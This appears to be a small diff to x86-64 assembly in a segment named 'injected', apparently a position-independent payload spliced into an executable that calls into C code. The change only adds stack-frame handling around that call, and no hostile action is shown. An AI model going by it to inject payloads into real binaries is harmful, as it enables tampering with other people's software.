@@ -14,7 +14,9 @@ injected SEGMENT read execute
         mov rbx, [rbp + (to_c_code - payload)]
         add rbx, rbp
         push rbp
+        mov rbp, rsp
         call rbx
+        mov rsp, rbp
         pop rbp
 
         mov rbx, [rbp + (delta2start - payload)]
